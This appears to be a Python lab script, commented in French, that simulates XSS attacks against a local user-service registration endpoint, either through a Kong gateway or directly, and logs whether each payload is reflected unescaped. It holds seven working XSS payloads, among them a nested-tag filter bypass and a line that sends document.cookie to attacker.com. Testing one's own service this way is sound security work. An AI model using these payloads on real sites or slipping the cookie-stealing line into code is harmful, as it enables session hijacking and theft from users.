"""
xss_attack.py
─────────────
Phase 3 — Simulation d'attaques XSS (Cross-Site Scripting)
Cible : user-service via Kong (localhost:8000) ou direct (localhost:5001)

Usage:
  python xss_attack.py                  # via Kong port 8000
  python xss_attack.py --direct         # direct port 5001
"""

import requests
import json
import argparse
from datetime import datetime

# ── Cibles ───────────────────────────────────────────────────────
KONG_BASE   = "http://localhost:8000"
DIRECT_BASE = "http://localhost:5001"

# ── Payloads XSS ─────────────────────────────────────────────────
PAYLOADS = [
    {
        "name": "Script tag basique",
        "username": "<script>alert('XSS')</script>",
        "email": "xss1@test.com",
        "desc": "Balise <script> directe dans le champ username"
    },
    {
        "name": "Image onerror",
        "username": "<img src=x onerror=alert(document.cookie)>",
        "email": "xss2@test.com",
        "desc": "XSS via attribut onerror sur image cassée"
    },
    {
        "name": "SVG onload",
        "username": "<svg onload=alert('XSS')>",
        "email": "xss3@test.com",
        "desc": "XSS via balise SVG et événement onload"
    },
    {
        "name": "JavaScript URI",
        "username": "javascript:alert('XSS')",
        "email": "xss4@test.com",
        "desc": "Protocole javascript: injecté comme valeur"
    },
    {
        "name": "Event handler",
        "username": "\" onmouseover=\"alert('XSS')",
        "email": "xss5@test.com",
        "desc": "Injection via guillemets dans un attribut HTML"
    },
    {
        "name": "Balises imbriquees",
        "username": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "email": "xss6@test.com",
        "desc": "Bypass de filtres regex simples par imbrication"
    },
    {
        "name": "Vol de cookie simulé",
        "username": "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
        "email": "xss7@test.com",
        "desc": "Exfiltration de cookie vers serveur attaquant"
    },
]

logs = []

def check_reflected(payload: str, response_body: str) -> bool:
    """Vérifie si le payload XSS est retourné non échappé dans la réponse."""
    dangerous = ["<script>", "onerror=", "onload=", "javascript:", "onmouseover="]
    return any(tag in response_body for tag in dangerous) and payload in response_body

def run(base_url: str):
    url = f"{base_url}/users/register"
    print(f"\n{'='*55}")
    print(f"  XSS ATTACK → {url}")
    print(f"{'='*55}\n")

    for p in PAYLOADS:
        body = {
            "username": p["username"],
            "email":    p["email"],
            "password": "password123",
        }

        print(f"  [*] {p['name']}")
        print(f"      Payload : {p['username'][:70]}")
        print(f"      Objectif: {p['desc']}")

        try:
            r = requests.post(url, json=body, timeout=5)
            status   = r.status_code
            response = r.text

            # Vérifie si le payload est reflété tel quel (sans échappement)
            reflected = check_reflected(p["username"], response)
            verdict   = "PAYLOAD REFLETE ⚠️  (XSS possible)" if reflected else "Non reflété ✅"

            print(f"      HTTP    : {status}")
            print(f"      Reponse : {response[:150]}")
            print(f"      Verdict : {verdict}\n")

        except requests.exceptions.ConnectionError:
            print(f"      ERREUR  : Service non joignable sur {url}\n")
            continue

        logs.append({
            "timestamp"   : datetime.utcnow().isoformat() + "Z",
            "type"        : "XSS",
            "payload_name": p["name"],
            "url"         : url,
            "payload_sent": body,
            "http_status" : status,
            "response"    : response[:300],
            "reflected"   : reflected,
        })

    # Sauvegarde
    with open("xss_logs.json", "w") as f:
        json.dump(logs, f, indent=2, ensure_ascii=False)

    total     = len(logs)
    reflected = sum(1 for l in logs if l["reflected"])
    print(f"{'='*55}")
    print(f"  Résultats : {total} tests | {reflected} payload(s) reflété(s) | {total-reflected} filtrés")
    print(f"  Logs      : xss_logs.json")
    print(f"{'='*55}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--direct", action="store_true",
                        help="Attaque directe port 5001 (bypass Kong)")
    args = parser.parse_args()

    base = DIRECT_BASE if args.direct else KONG_BASE
    mode = "DIRECT port 5001" if args.direct else "via Kong port 8000"
    print(f"\n  Mode : {mode}")

    run(base)